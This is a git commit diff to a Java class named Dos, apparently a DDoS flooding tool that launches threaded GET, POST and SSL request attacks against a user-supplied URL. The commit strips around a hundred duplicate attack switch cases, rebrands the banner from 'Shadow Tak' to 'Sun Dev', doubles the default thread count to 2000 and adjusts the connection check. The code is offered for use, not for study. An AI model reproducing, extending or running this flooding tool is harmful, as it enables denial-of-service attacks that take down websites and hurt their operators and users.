a34a93ba486b1d42390ad79c7382ae7185c1c306
Javaddosdev <113961204+Javaddosdev@users.noreply.github.com>
2022-09-23 00:14:38 +0700

    Update sun.java

--- sun.java
+++ sun.java
@@ -38,294 +38,6 @@ public class Dos implements Runnable {
                     case 4:
                         sslGetAttack(Dos.url);
                         break;
-                    case 5:
-                        postAttack(Dos.url);
-                        break;
-                    case 6:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 7:
-                        getAttack(Dos.url);
-                        break;
-                    case 8:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 9:
-                        postAttack(Dos.url);
-                        break;
-                    case 10:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 11:
-                        getAttack(Dos.url);
-                        break;
-                    case 12:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 13:
-                        postAttack(Dos.url);
-                        break;
-                    case 14:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 15:
-                        getAttack(Dos.url);
-                        break;
-                    case 16:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 17:
-                        postAttack(Dos.url);
-                        break;
-                    case 18:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 19:
-                        getAttack(Dos.url);
-                        break;
-                    case 20:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 21:
-                        postAttack(Dos.url);
-                        break;
-                    case 22:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 23:
-                        getAttack(Dos.url);
-                        break;
-                    case 24:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 25:
-                        postAttack(Dos.url);
-                        break;
-                    case 26:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 27:
-                        getAttack(Dos.url);
-                        break;
-                    case 28:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 29:
-                        postAttack(Dos.url);
-                        break;
-                    case 30:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 31:
-                        getAttack(Dos.url);
-                        break;
-                    case 32:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 33:
-                        postAttack(Dos.url);
-                        break;
-                    case 34:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 35:
-                        getAttack(Dos.url);
-                        break;
-                    case 36:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 37:
-                        postAttack(Dos.url);
-                        break;
-                    case 38:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 39:
-                        getAttack(Dos.url);
-                        break;
-                    case 40:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 41:
-                        postAttack(Dos.url);
-                        break;
-                    case 42:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 43:
-                        getAttack(Dos.url);
-                        break;
-                    case 44:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 45:
-                        postAttack(Dos.url);
-                        break;
-                    case 46:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 47:
-                        getAttack(Dos.url);
-                        break;
-                    case 48:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 49:
-                        postAttack(Dos.url);
-                        break;
-                    case 50:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 51:
-                        getAttack(Dos.url);
-                        break;
-                    case 52:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 53:
-                        postAttack(Dos.url);
-                        break;
-                    case 54:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 55:
-                        getAttack(Dos.url);
-                        break;
-                    case 56:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 57:
-                        postAttack(Dos.url);
-                        break;
-                    case 58:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 59:
-                        getAttack(Dos.url);
-                        break;
-                    case 60:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 61:
-                        postAttack(Dos.url);
-                        break;
-                    case 62:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 63:
-                        getAttack(Dos.url);
-                        break;
-                    case 64:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 65:
-                        postAttack(Dos.url);
-                        break;
-                    case 66:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 67:
-                        getAttack(Dos.url);
-                        break;
-                    case 68:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 69:
-                        postAttack(Dos.url);
-                        break;
-                    case 70:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 71:
-                        getAttack(Dos.url);
-                        break;
-                    case 72:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 73:
-                        postAttack(Dos.url);
-                        break;
-                    case 74:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 75:
-                        getAttack(Dos.url);
-                        break;
-                    case 76:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 77:
-                        postAttack(Dos.url);
-                        break;
-                    case 78:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 79:
-                        getAttack(Dos.url);
-                        break;
-                    case 80:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 81:
-                        postAttack(Dos.url);
-                        break;
-                    case 82:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 83:
-                        getAttack(Dos.url);
-                        break;
-                    case 84:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 85:
-                        postAttack(Dos.url);
-                        break;
-                    case 86:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 87:
-                        getAttack(Dos.url);
-                        break;
-                    case 88:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 89:
-                        postAttack(Dos.url);
-                        break;
-                    case 90:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 91:
-                        getAttack(Dos.url);
-                        break;
-                    case 92:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 93:
-                        postAttack(Dos.url);
-                        break;
-                    case 94:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 95:
-                        getAttack(Dos.url);
-                        break;
-                    case 96:
-                        sslGetAttack(Dos.url);
-                        break;
-                    case 97:
-                        postAttack(Dos.url);
-                        break;
-                    case 98:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 99:
-                        getAttack(Dos.url);
-                        break;
-                    case 100:
-                        sslGetAttack(Dos.url);
-                        break;
 
                 }
             }
@@ -354,13 +66,13 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Shadow Tak");
+        System.out.println("Setting DDoS By: Sun Dev");
 
         System.out.print("Thread: ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 1000;
+            Dos.amount = 2000;
         } else {
             Dos.amount = Integer.parseInt(amount);
         }
@@ -382,7 +94,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(1000);
+        Thread.sleep(2000);
 
 
         System.out.println("Starting Attack");
@@ -412,7 +124,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        if (responseCode == 500) {
+        if (responseCode == 200) {
             System.out.println("Connected to website");
         }
         Dos.url = url;
@@ -426,7 +138,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        if (responseCode == 500) {
+        if (responseCode == 200) {
             System.out.println("Connected to website");
         }
         Dos.url = url;
